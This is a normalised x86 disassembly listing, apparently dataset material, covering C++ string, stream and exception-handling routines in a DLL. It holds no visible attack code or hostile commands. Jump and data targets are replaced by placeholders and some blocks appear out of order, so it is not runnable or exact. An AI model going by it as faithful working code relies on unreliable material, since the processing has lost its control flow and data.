jne r-xdata
mov ecx esi
call sub_10007d3b
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_10008230
push 0x98
mov eax sub_1004d801
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_100037dd
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_10008315
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_10008315
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_1000834b
mov eax esi
call sub_100282db
retn 0xc
sub_1000834b
push 0x14
mov eax sub_1004cad6
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10024c18
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10023577
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_1000847e
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10023577
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_100085d5
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10023577
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
mov [ ebp - 0x1c ] edx
call sub_100085d5
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10023577
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_100087f2
mov [ esi + 0xc ] ax
call sub_10023577
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_100087f2
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_100282db
retn 0x8
call sub_10023577
lea eax [ ebp - 0x20 ]
push eax
push ebx
push r--data
call sub_1000847e
mov [ esi + 0x8 ] eax
call sub_10023577
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_100087f2
mov [ esi + 0xc ] ax
call sub_10023577
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x14 ] edx
call sub_100087f2
add esp 0x24
mov [ esi + 0xe ] ax
sub_1000847e
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call sub_10024630
mov esi eax
inc esi
push esi
call sub_10024077
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
test esi esi
ja r-xdata
mov dl [ edi ]
dec esi
mov [ ecx ] dl
inc ecx
inc edi
pop edi
pop esi
retn
sub_100084a7
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x14 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x18 ] eax
je r-xdata
push 0x1
push eax
call sub_10001ed2
test al al
je r-xdata
push edi
mov ecx esi
call sub_10002004
sub_100084d4
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1000850b
push esi
mov esi ecx
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
inc [ esi + 0x4 ]
mov eax esi
pop esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10024832
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10024832
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10008559
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
neg eax
sbb eax eax
inc eax
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10024832
cmp eax [ edi ]
je r-xdata
sub_10008585
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
sar eax 0x1
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10024832
cmp eax [ edi ]
je r-xdata
sub_100085ae
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
sub eax [ edi + 0x4 ]
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
call sub_10024832
cmp eax [ edi ]
je r-xdata
sub_100085d5
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10024630
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10024077
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
add esp 0x14
test eax eax
jle r-xdata
test edi edi
ja r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
inc edi
test ebx ebx
ja r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_1002382a
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
add [ ebp + 0x8 ] eax
dec edi
inc ebx
inc ebx
sub_10008687
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_100234f0
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_100086af
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_10022f7c
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_10022f44
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10001ed2
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
add edi ebx
sub eax ecx
push edi
push eax
add ecx edx
push ecx
call sub_10001fe8
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_10002004
sub_10008756
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001bb5
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10022f44
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_100086af
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_10001ed2
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
add ecx edx
push ecx
call sub_10001fe8
add esp 0x10
push edi
mov ecx esi
call sub_10002004
sub_100087f2
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1002382a
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1000881e
mov ecx [ esi + 0x20 ]
xor eax eax
cmp [ ecx ] eax
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax ]
mov ecx esi
call sub_1003f606
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
add [ eax ] 0x2
mov eax [ esi + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
mov ecx esi
call sub_1003f123
movzx eax ax
retn
mov eax ecx
retn
sub_10008866
push 0x4
mov eax sub_1004ec92
call sub_10028236
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_10003dcd
xor al al
or ecx 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi eax
call sub_1000538a
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x10 ]
test cl 0x1
je r-xdata
mov al 0x1
jmp r-xdata
lea ecx [ ebp + 0xc ]
push ecx
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
call sub_10003950
pop ecx
lea ecx [ ebp + 0xc ]
mov ebx eax
call sub_10003c49
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
call sub_1003f123
call sub_100282db
retn 0x8
mov edx [ ebx ]
push eax
push 0x48
mov ecx ebx
call [ edx + 0x8 ]
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x1
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
call sub_1000881e
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push eax
call sub_10003dcd
jmp r-xdata
or ecx 0x4
movzx eax ax
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_1000893d
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or ecx 0x4
sub_1000899d
push 0x0
mov eax sub_1004efa9
call sub_10028203
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_10008866
mov [ esi + 0x4 ] al
mov eax esi
call sub_100282db
retn 0xc
lea ecx [ eax + 0x4 ]
call sub_1002312c
sub_100089e1
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10024832
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10008a50
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ esp + 0x8 ]
push eax
call sub_100052d6
mov eax [ esp + 0x4 ]
retn 0x4
sub_10008a76
push 0x1e0
mov eax sub_1004f092
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x104 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x108 ] eax
lea eax [ ebp - 0x114 ]
mov edi ecx
push eax
xor ebx ebx
mov eax edi
mov [ ebp - 0x10c ] ebx
call sub_100051c8
mov esi eax
lea eax [ ebp - 0x11c ]
push eax
mov ecx edi
call sub_10008a30
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0xb8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_1000c105
push 0xf
xor edi edi
pop esi
inc edi
mov [ ebp - 0x4 ] edi
push ebx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x84 ] esi
call sub_10002004
lea eax [ ebp - 0x9c ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100090ff
cmp [ ebp - 0x84 ] 0x10
mov eax [ ebp - 0x98 ]
pop ecx
pop ecx
jae r-xdata
mov [ ebp - 0x110 ] eax
mov eax [ ebp - 0x104 ]
push ebx
cmp [ eax + 0x14 ] ebx
ja r-xdata
lea eax [ ebp - 0x98 ]
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x68 ] esi
call sub_10002004
mov edx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0x3
push [ ebp - 0x108 ]
lea ecx [ ebp - 0x80 ]
call sub_10008f87
pop ecx
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10002004
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] esi
call sub_10002004
push ebx
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4c ] esi
call sub_10002004
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x1a8 ]
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0xfc ] bl
mov [ ebp - 0xf8 ] 0xb3
mov [ ebp - 0xf4 ] r--data
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xe8 ] bl
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xdc ] ebx
call sub_100096ea
push 0x4
pop esi
push esi
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_10009cec
push edi
lea eax [ ebp - 0xfc ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push esi
lea eax [ ebp - 0xf8 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push ebx
push [ ebp - 0xf8 ]
lea ecx [ ebp - 0x64 ]
call sub_1000957d
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
mov esi [ ebp - 0xd8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] ebx
call sub_1000c867
push ebx
push ebx
push esi
call sub_10001a27
add esp 0xc
push ebx
push edi
lea ecx [ ebp - 0x9c ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0xb8 ]
call sub_10002020
mov eax esi
jmp r-xdata
push [ ebp - 0xf8 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
cmp [ ebp - 0x4c ] 0x10
mov eax [ ebp - 0x60 ]
jae r-xdata
lea eax [ ebp - 0x60 ]
call sub_100282ef
retn
mov [ ebp - 0xf4 ] eax
push esi
lea eax [ ebp - 0xf0 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push ebx
push [ ebp - 0xf0 ]
lea ecx [ ebp - 0x2c ]
call sub_1000957d
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0xf0 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0xec ] eax
push edi
lea eax [ ebp - 0xe8 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push esi
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push esi
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
push ebx
push [ ebp - 0xe0 ]
lea ecx [ ebp - 0x48 ]
call sub_1000957d
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
call sub_10009cec
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea eax [ ebp - 0x44 ]
cmp [ ebp - 0x68 ] 0x10
mov ecx [ ebp - 0xf8 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp - 0xf0 ]
lea eax [ eax + ecx + 0xd ]
mov ecx [ ebp - 0x7c ]
jae r-xdata
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x6c ]
sub edx eax
add ecx eax
push edx
push ecx
lea ecx [ ebp - 0xd4 ]
call sub_100026d3
mov [ ebp - 0x4 ] 0x8
push [ ebp - 0x110 ]
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0xd4 ]
call sub_10012695
pop ecx
pop ecx
cmp al 0x1
je r-xdata
lea ecx [ ebp - 0x7c ]
push 0x24
call sub_10024389
pop ecx
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x4 ] 0xa
cmp eax ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x1c4 ]
call sub_10001c7f
lea eax [ ebp - 0x1c4 ]
push eax
lea ecx [ ebp - 0x1ec ]
mov [ ebp - 0x4 ] 0x9
call sub_10002075
push r--data
lea eax [ ebp - 0x1ec ]
push eax
call sub_10027dd1
xor esi esi
cmp [ ebp - 0xe8 ] 0x1
lea edi [ ebp - 0x48 ]
sete cl
movzx ecx cl
push ecx
push eax
call sub_100094d0
xor edi edi
mov esi eax
inc edi
jmp r-xdata
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0xd8 ]
push esi
lea ecx [ eax + 0x4 ]
mov [ eax ] esi
call sub_1000c867
push esi
push esi
push [ ebp - 0xd8 ]
call sub_10001a27
add esp 0xc
push ebx
push edi
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x10c ] edi
call sub_10002020
lea eax [ ebp - 0x1a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10008eb7
push ebx
push edi
lea ecx [ ebp - 0x64 ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0x80 ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0x9c ]
call sub_10002020
push ebx
push edi
lea ecx [ ebp - 0xb8 ]
call sub_10002020
mov eax [ ebp - 0xd8 ]
sub_10008ed3
push 0x60
mov eax sub_1004e98c
call sub_1002826c
mov edi [ ebp + 0x8 ]
push r--data
mov ebx edx
mov [ ebp - 0x68 ] ecx
call sub_10001c62
mov eax [ ebx + 0x14 ]
test eax eax
jbe r-xdata
call sub_100282ef
retn
push 0xf
pop esi
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_10002004
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
call sub_10009387
pop ecx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] esi
call sub_10002004
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000917a
pop ecx
push ebx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000957d
push ebx
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4c ] esi
call sub_10002004
mov edi [ ebp - 0x68 ]
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000909b
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10002020
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10008f87
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e94c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov edi edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
call sub_10001c62
push 0xf
pop ebx
xor esi esi
push esi
lea ecx [ esp + 0x58 ]
mov [ esp + 0x70 ] ebx
call sub_10002004
lea eax [ esp + 0x54 ]
push eax
push edi
mov [ esp + 0x88 ] esi
call sub_100090ff
pop ecx
pop ecx
push esi
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] ebx
call sub_10002004
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0x84 ] 0x1
call sub_10009256
pop ecx
push esi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] ebx
call sub_10002004
mov edi [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea ebx [ esp + 0x3c ]
mov [ esp + 0x84 ] 0x2
call sub_10009387
pop ecx
mov ecx [ esp + 0x18 ]
push 0xffffffff
push esi
lea eax [ esp + 0x24 ]
push eax
call sub_10001f30
push esi
push 0x1
lea ecx [ esp + 0x24 ]
call sub_10002020
push esi
push 0x1
mov ecx ebx
call sub_10002020
push esi
push 0x1
lea ecx [ esp + 0x5c ]
call sub_10002020
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
sub_1000909b
push 0x40
mov eax sub_1004e3eb
call sub_1002826c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
mov ecx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push ecx
push eax
lea esi [ ebp - 0x30 ]
call sub_10015017
lea eax [ ebp - 0x4c ]
xor esi esi
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] esi
call sub_100168a4
pop ecx
push 0xffffffff
push esi
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10001f30
push esi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_10002020
lea ecx [ ebp - 0x30 ]
call sub_10015032
call sub_100282ef
retn
sub_100090ff
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e3c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x8 ]
lea eax [ esp + 0x8 ]
push eax
call sub_10016780
pop ecx
pop ecx
and [ esp + 0x18 ] 0x0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
add eax 0x4
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
call sub_10003d5c
mov ecx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
call sub_10001f30
or [ esp + 0x18 ] 0xffffffff
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
sub_1000917a
push 0x70
mov eax sub_1004d79d
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
fild [ esi + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jge r-xdata
fmul [ r--data ]
call sub_1004b616
mov ecx 0x258
sub ecx eax
xor edi edi
push edi
push ecx
lea ecx [ ebp - 0x30 ]
call sub_100079fe
mov [ ebp - 0x4 ] edi
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
fadd [ r--data ]
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
push esi
lea eax [ ebp - 0x34 ]
call sub_1001d285
cmp eax edi
je r-xdata
lea ebx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ebx [ ebp - 0x2c ]
jae r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push edi
push eax
lea esi [ ebp - 0x54 ]
call sub_100095a1
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push edi
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10001f30
push edi
push 0x1
mov ecx esi
call sub_10002020
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
call sub_100282ef
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_10027dd1
sub_10009256
push 0x70
mov eax sub_1004d79d
call sub_1002826c
mov eax [ ebp + 0x8 ]
push 0x20
pop edi
xor ebx ebx
mov esi ecx
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
call sub_10002004
mov [ ebp - 0x4 ] ebx
